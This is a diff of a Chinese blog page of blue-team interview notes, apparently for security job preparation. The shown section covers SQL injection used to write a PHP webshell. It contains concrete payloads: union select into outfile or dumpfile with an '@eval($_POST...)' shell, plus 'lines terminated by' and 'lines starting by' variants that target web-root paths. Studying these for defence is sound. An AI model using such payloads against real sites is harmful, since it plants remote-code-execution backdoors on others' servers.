@@ -5,7 +5,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> - H3ppo</title>
+    <title>蓝队面试笔记 - H3ppo</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
@@ -32,7 +32,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://H3ppo.github.io"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle"></h3>
+    <h3 class="subtitle">蓝队面试笔记</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -47,7 +47,7 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title"></h1>
+        <h1 class="title">蓝队面试笔记</h1>
         <div class="stuff">
             <span>四月 22, 2024</span>
             
@@ -236,9 +236,8 @@
 <ul>
 <li>知道web绝对路径</li>
 <li>有文件写入权限(一般情况只有ROOT用户有)</li>
-<li>数据库开启了secure_file_priv设置<br>然后就能用select into outfile写入webshell</li>
+<li>数据库开启了secure_file_priv设置<br>然后就能用select into outfile写入webshell<br><strong>常见手法：</strong><br>联合注入写入<br>?id=1’ union select 1,”<!--?php @eval($_POST['shell']);?-->“,3 into outfile ‘C:\phpstudy\WWW\sqli\shell.php’#  </li>
 </ul>
-<p><strong>常见手法：</strong><br>联合注入写入<br>?id=1’ union select 1,”<!--?php @eval($_POST['shell']);?-->“,3 into outfile ‘C:\phpstudy\WWW\sqli\shell.php’#  </p>
 <p>dumpfile函数写入<br>?id=1’ union select 1,”<!--?php @eval($_POST['shell']);?-->“,3 into dumpfile ‘C:\phpstudy\WWW\sqli\shell.php’#  </p>
 <p>lines terminated by 写入<br>?id=1 into outfile ‘C:/wamp64/www/shell.php’ lines terminated by ‘<!--?php phpinfo()?-->‘; //lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。  </p>
 <p>lines starting by 写入<br>?id=1 into outfile ‘C:/wamp64/www/shell.php’ lines starting by ‘<!--?php phpinfo()?-->‘; //利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为 以每行开始的位置添加 xx 内容。  </p>
